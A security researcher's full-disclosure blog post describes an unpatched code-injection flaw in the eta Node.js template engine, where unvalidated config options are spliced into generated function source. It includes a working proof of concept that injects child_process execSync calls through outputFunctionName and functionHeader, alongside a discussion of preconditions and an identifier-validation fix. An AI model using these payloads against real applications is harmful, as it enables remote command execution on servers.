---
layout: post
title: "The Option That Was Really Code"
subtitle: "eta compiles templates with new Function. Three of its config options get spliced into that generated source raw — and two sibling engines already got a CVE for exactly this."
date: 2026-09-10
tags: [rce, nodejs, template-injection, cwe-94, full-disclosure]
read_time: "6 min read"
---

[eta](https://github.com/eta-dev/eta) is a fast, modern template engine for Node — an EJS-family successor. Template engines that compile to JavaScript are always interesting, because somewhere inside them is a `new Function(...)` that turns a string into runnable code, and the only question that matters is: *which strings reach it?*

## The boring part

The safe answer is supposed to be "only the template body and the render data, both of which the engine escapes." You render a template, you pass in data, nothing you pass becomes code. That's the contract, and for the template body and the data, eta honours it.

But a template engine also has *configuration*. eta lets you set `varName` (the name of the data object inside the compiled function), `outputFunctionName`, and `functionHeader`. These are identifier-ish knobs. And here's the thing about identifiers in a code generator: they aren't escaped, because they're supposed to *be* code.

## The tilt-your-head part

Watch where those three options go, in `dist/index.cjs`:

```js
// varName becomes the raw first PARAMETER of new Function:
return new ctor(config.varName, "options", this.compileToString(...));
// functionHeader spliced raw at the top of the body:
let res = `${config.functionHeader}\n ...`;
// outputFunctionName spliced raw as a function name in the body:
function ${config.outputFunctionName}(s){__eta.res+=s;}
```

None of the three is validated. There is no `/^[a-zA-Z_$][\w$]*$/` check anywhere in the tree — I grepped. So if an application builds an eta instance from untrusted input — `new Eta(userConfig)`, or spreading request data into `eta.configure(...)`, the kind of thing a multi-tenant templating service does — the attacker isn't supplying an identifier. They're supplying a fragment of the function source. Break out of the identifier position and you're writing the body.

And this is a *known* class. `ejs` added `_JS_IDENTIFIER.test()` on exactly these options after **CVE-2022-29078**. `squirrelly` added `isValidJSIdentifier(options.varName)` after **CVE-2021-32820**. Same lineage, same sink. eta just never got the hardening.

## Proof

Against published `eta@4.6.0` (current latest). Every case renders an *ordinary, trusted* template — the injection is entirely in the config:

<div class="term">
  <div class="term-bar"><span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span><span class="term-title">node verify.mjs — eta 4.6.0</span></div>
<pre>const CP = "process.getBuiltinModule('child_process')";

new Eta({ outputFunctionName: `a(){};${CP}.execSync('id > A.txt');function b` })
    .renderString('&lt;p&gt;ordinary trusted template&lt;/p&gt;', { n: 'x' });

new Eta({ functionHeader: `${CP}.execSync('id > B.txt');` })
    .renderString('&lt;p&gt;ordinary trusted template&lt;/p&gt;');

<span class="dim">A.txt -></span> <span class="warn">uid=1000 gid=1000 groups=1000,65534(nogroup)</span>
B.txt -> <span class="warn">uid=1000 gid=1000 groups=1000,65534(nogroup)</span>
<span class="bad">*** command execution confirmed ***</span></pre>
</div>

(`process.getBuiltinModule('child_process')` because the compiled function runs in ESM scope where `require` is absent; under CommonJS `require('child_process')` works directly.)

## The honest precondition

I want to be precise about reachability, because it's the difference between "9.8" and "8.1 High," and overselling it would be the wrong move. This is **not** template-author RCE and **not** reachable from render data or per-render options — I tested those and they're safe. It requires the app to pass **untrusted input into an eta config option**. That's a real pattern (config derived from user JSON, request data spread into the constructor) but it's a precondition, and the score should say so. I also checked prototype pollution — the three options are set as own defaults, so a polluted prototype doesn't flow in. Negative, reported for completeness.

## The fix

The check ejs and squirrelly already ship:

```js
const JS_IDENT = /^[a-zA-Z_$][0-9a-zA-Z_$]*$/;
if (!JS_IDENT.test(config.varName)) throw new EtaError('invalid varName');
if (!JS_IDENT.test(config.outputFunctionName)) throw new EtaError('invalid outputFunctionName');
// and either drop functionHeader or document it as trusted-only.
```

## Where this stands

Present on `eta@4.6.0`, current `latest` — `npm audit` reports zero known vulns for it. No CVE for this sink, no fix. Full disclosure, anchored to the ejs/squirrelly precedent. If your app builds eta config from anything a user can influence: validate `varName`/`outputFunctionName` yourself now, or don't let untrusted input near the constructor.

## Takeaways

- **In a code generator, "options" can mean "source."** Any config value spliced into generated code is a code-injection sink unless it's validated as an identifier.
- **Cross-engine precedent is gold.** When two siblings in the same family have CVEs for the identical sink and added the identical fix, the third one lacking it isn't a design choice.
- **Scope the precondition honestly.** Config-time RCE is real but narrower than template RCE. Saying so makes the report stronger, not weaker.

<hr>

*Full disclosure. Present on `eta` 4.6.0 (current latest) at time of writing; no CVE assigned, no fix released. Arbitrary command execution reproduced against the published package.*
